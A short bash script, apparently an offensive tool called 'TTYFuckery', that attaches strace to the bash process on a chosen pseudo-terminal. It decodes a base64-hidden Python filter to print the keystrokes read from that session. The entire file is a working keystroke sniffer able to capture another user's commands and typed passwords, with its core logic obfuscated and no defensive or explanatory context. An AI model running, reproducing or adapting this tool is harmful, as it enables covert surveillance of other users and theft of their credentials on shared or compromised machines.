#!/bin/bash
echo "[+] TTYFuckery"
echo "[?] by user@neko.li and reiko@neko.li"
if [ "$#" -ne 1 ]; then
w
echo "[?] usage: $0 ptsnum (ignore the pts/ just type the numer)"
exit 1
fi
READSCRIPT="aW1wb3J0IHN5cwp3aGlsZSBUcnVlOgogIHRyeToKICAgIHggPSBzeXMuc3RkaW4ucmVhZGxpbmUoKQogICAgaWYgKCdyZWFkKDAsJyBpbiB4IG9yICdyZWFkKDMsJyBpbiB4KSAgYW5kICdFTEZcXDJcXDFcXDEnIG5vdCBpbiB4OiAjIG1vcmUgdGhhbiAxMDAgY2hhcnMgaXMgcHJvYmFibHkgZ29ubmEgYmUgRUxGIGdhcmJhZ2UuLgogICAgICB4ID0geC5zcGxpdCgnIicpWzFdCiAgICAgIGlmIGxlbih4KSA8IDMwOiAKICAgICAgICB4ID0geC5yZXBsYWNlKCJcXDE3NyIsIjxiYWNrc3BhY2U+IikucmVwbGFjZSgiXFxuIiwiXG4iKQogICAgICAgIHN5cy5zdGRvdXQud3JpdGUoeC5yZXBsYWNlKCJcXHIiLCJcbiIpKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDogZXhpdCgpCiAgZXhjZXB0OiBwYXNzCgo="
ptsnum=`ps awfux | grep pt[s]\/"$1" | awk '/bas[h]/{print $2}'` ;
echo "[+] Hooking pts/" $1
echo "[+] Resolving bash to pid" $ptsnum
strace -f -q -e verbose=none -e trace=read -p $ptsnum 2>&1  | python -c "exec('$READSCRIPT'.decode('base64'))"